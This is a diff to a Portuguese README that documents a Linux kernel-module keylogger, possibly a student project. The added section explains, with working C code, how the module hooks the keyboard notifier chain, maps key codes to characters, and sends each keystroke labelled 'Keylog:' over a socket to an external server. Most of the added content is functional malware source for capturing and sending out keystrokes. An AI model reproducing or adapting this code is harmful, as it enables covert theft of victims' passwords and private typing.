@@ -116,9 +116,6 @@ endereco.sin_addr.s_addr = htonl(criaEndereco(ip));
 //Conecta o cliente ao servidor externo.
 socket->ops->connect(socket, (struct sockaddr*)&endereco, sizeof(endereco), O_RDWR);
 
-//Iniciar o notifier do teclado.
-register_keyboard_notifier(&keysniffer_blk);
-
 ```
 
 
@@ -164,7 +161,95 @@ while(1){
 
 ### **5.3. Listener das teclas**
 
+O Listener das teclas é divido em 4 partes, sendo elas o ```mapa_de_teclas```, o ```bloco_observador_teclado```, o ```manipulador_evento_teclado``` e a ```converte_codigo_tecla_para_string```.
 
+#### **5.3.1. Mapa de Teclas**
+
+OAqui é definido um mapeamento de teclas chamado mapa_de_teclas, que associa códigos de teclas a caracteres correspondentes. Cada entrada no array bidimensional mapa_de_teclas possui duas strings: a primeira representa a tecla sem o Shift pressionado, e a segunda representa a tecla com o Shift pressionado. 
+
+```
+static const char *mapa_de_teclas[][2] = {
+    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
+    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
+    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
+    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
+    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
+    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
+    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
+    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
+    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
+    .
+    .
+    .
+};
+```
+### **5.3.2 Bloco Observador Teclado**
+
+Aqui é definida uma estrutura notifier_block chamada bloco_observador_teclado, que possui um membro notifier_call apontando para a função manipulador_evento_teclado. Essa estrutura é usada para registrar o módulo como um observador dos eventos de teclado.
+
+```
+static struct notifier_block bloco_observador_teclado = {
+    .notifier_call = manipulador_evento_teclado,
+};
+```
+
+### **5.3.3 Manipulador de Eventos do Teclado**
+
+Essa função, manipulador_evento_teclado, é a função de retorno de chamada que é chamada sempre que ocorre um evento de teclado. Ela recebe informações sobre o evento, como o código da tecla e a ação (pressionar ou soltar a tecla), e registra as teclas pressionadas utilizando a função converte_codigo_tecla_para_string.
+
+```
+int manipulador_evento_teclado(struct notifier_block *bloco_notificacao, unsigned long codigo, void *_parametro){
+    // Cria buffer para a conversao do codigo de tecla para string.
+    char buffer_teclas[12] = {0};
+
+    // Converte o parametro (void *) recebido prara (keyboard_notifier_param *). 
+    struct keyboard_notifier_param *parametro = _parametro;
+ 
+    if (!(parametro->down)) return NOTIFY_OK;
+    
+    // Converte o codigo da tecla na string equivalente e salva no buffer.
+    converte_codigo_tecla_para_string(parametro->value, parametro->shift, buffer_teclas, 12);
+    
+    // Se a string for nula ele termina a rotina aqui.
+    if (strlen(buffer_teclas) < 1) return NOTIFY_OK;
+    
+    // Cria uma string para enviar pelo socket.
+    char enviar[32];
+    memset(&enviar, 0, 32);
+
+    // Monta a string no padrão "Keylog: <tecla>".
+    strcat(enviar, "Keylog: ");
+    strcat(enviar, buffer_teclas);
+    strcat(enviar, "\n");
+
+    // Envia a string pelo socket.
+    enviarMensagem(socket, enviar, strlen(enviar), MSG_DONTWAIT);
+
+    // Printa no log (local) a tecla precionada.
+    printk(KERN_INFO "Keylog: %s", buffer_teclas);
+ 
+    return NOTIFY_OK;
+}
+```
+
+### **5.3.4 Converte o Codigo da Tecla para String **
+
+Esta função, converte_codigo_tecla_para_string, converte um código de tecla e uma máscara de Shift em uma sequência de caracteres correspondente. A sequência é armazenada no buffer fornecido como parâmetro.
+
+```
+void converte_codigo_tecla_para_string(int codigo_tecla, int mascara_shift, char *buf, unsigned int tam_buf){
+    // Se a tecla esta dentro do intervalo de teclas mapeadas.
+    if (codigo_tecla > KEY_RESERVED && codigo_tecla <= KEY_PAUSE)
+    {
+        // Se o shift estiver pressionado pega codigo na posicao 1 se nao pega na posicao 0.
+        const char *string_tecla = (mascara_shift == 1)
+                                ? mapa_de_teclas[codigo_tecla][1]
+                                : mapa_de_teclas[codigo_tecla][0];
+        // Copia o const char para o buffer como string.
+        snprintf(buf, tam_buf, "%s", string_tecla);
+    }
+}
+```
 
 ## **6. Tecnologias**
 
